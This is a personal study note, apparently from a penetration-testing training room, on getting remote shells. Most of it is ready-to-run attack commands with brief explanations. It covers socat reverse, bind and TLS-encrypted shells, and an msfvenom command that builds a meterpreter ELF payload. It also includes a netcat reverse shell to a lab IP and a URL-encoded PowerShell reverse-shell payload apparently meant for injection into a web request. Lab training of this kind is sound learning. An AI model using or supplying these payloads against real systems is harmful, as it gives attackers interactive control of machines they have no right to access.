# What_The_Shell 

> VOiD | Monday 02 August 2021 10:54:17 PM IST

My IP : 10.17.6.109
Target IP : 

# Socat
Socat is similar to netcat in some ways, but fundamentally different in many others. The easiest way to think about socat is as a connector between two points. In the interests of this room, this will essentially be a listening port and the keyboard, however, it could also be a listening port and a file, or indeed, two listening ports. All socat does is provide a link between two points -- much like the portal gun from the Portal games!

Once again, let's start with reverse shells.

Reverse Shells

As mentioned previously, the syntax for socat gets a lot harder than that of netcat. Here's the syntax for a basic reverse shell listener in socat:

socat TCP-L:<port> -

As always with socat, this is taking two points (a listening port, and standard input) and connecting them together. The resulting shell is unstable, but this will work on either Linux or Windows and is equivalent to nc -lvnp <port>.

On Windows we would use this command to connect back:

socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes

The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.

This is the equivalent command for a Linux Target:

socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"

Bind Shells

On a Linux target we would use the following command:

socat TCP-L:<PORT> EXEC:"bash -li"

On a Windows target we would use this command for our listener:

socat TCP-L:<PORT> EXEC:powershell.exe,pipes

We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.

Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.

socat TCP:<TARGET-IP>:<TARGET-PORT> -

Now let's take a look at one of the more powerful uses for Socat: a fully stable Linux tty reverse shell. This will only work when the target is Linux, but is significantly more stable. As mentioned earlier, socat is an incredibly versatile tool; however, the following technique is perhaps one of its most useful applications. Here is the new listener syntax:

socat TCP-L:<port> FILE:`tty`,raw,echo=0

Let's break this command down into its two parts. As usual, we're connecting two points together. In this case those points are a listening port, and a file. Specifically, we are allocating a new tty, and setting the echo to be zero. This is approximately equivalent to using the Ctrl + Z, stty raw -echo; fg trick with a netcat shell -- with the added bonus of being immediately stable and allocating a full tty.

The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command. This means that the target must have socat installed. Most machines do not have socat installed by default, however, it's possible to upload a precompiled socat binary, which can then be executed as normal.

The special command is as follows:

socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane

This is a handful, so let's break it down.

The first part is easy -- we're linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with  EXEC:"bash -li". We're also passing the arguments: pty, stderr, sigint, setsid and sane:

pty, allocates a pseudoterminal on the target -- part of the stabilisation process
stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
setsid, creates the process in a new session
sane, stabilises the terminal, attempting to "normalise" it.
That's a lot to take in, so let's see it in action.

As normal, on the left we have a listener running on our local attacking machine, on the right we have a simulation of a compromised target, running with a non-interactive shell. Using the non-interactive netcat shell, we execute the special socat command, and receive a fully interactive bash shell on the socat listener to the left:



Note that the socat shell is fully interactive, allowing us to use interactive commands such as SSH. This can then be further improved by setting the stty values as seen in the previous task, which will let us use text editors such as Vim or Nano.

If, at any point, a socat shell is not working correctly, it's well worth increasing the verbosity by adding -d -d into the command. This is very useful for experimental purposes, but is not usually necessary for general use.



=======================================================


What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is elf and the output filename should be shell

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=443 -a x64 -f elf -o shell

```

# Socat encryption shell

We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:
```bash

openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```
This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.
We then need to merge the two created files into a single .pem file:
```bash

cat shell.key shell.crt > shell.pem

# Now, when we set up our reverse shell listener, we use:

socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
# This sets up an OPENSSL listener using our generated certificate. verify=0 tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate must be used on whichever device is listening.

# To connect back, we would use:

socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash

# The same technique would apply for a bind shell:

Target:

socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes

Attacker:

socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```

```bash

socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0


```

=========================================================

```bash

nc 10.17.6.109 4444 -e /bin/bash

```

=powershell%20-nop%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient(%2710.10.153.201%27%2C4444)%3B%24stream%20%3D%20%24client.GetStream()%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile((%24i%20%3D%20%24stream.Read(%24bytes%2C%200%2C%20%24bytes.Length))%20-ne%200)%7B%3B%24data%20%3D%20(New-Object%20-TypeName%20System.Text.ASCIIEncoding).GetString(%24bytes%2C0%2C%20%24i)%3B%24sendback%20%3D%20(iex%20%24data%202%3E%261%20%7C%20Out-String%20)%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20(pwd).Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20(%5Btext.encoding%5D%3A%3AASCII).GetBytes(%24sendback2)%3B%24stream.Write(%24sendbyte%2C0%2C%24sendbyte.Length)%3B%24stream.Flush()%7D%3B%24client.Close()%22%0A

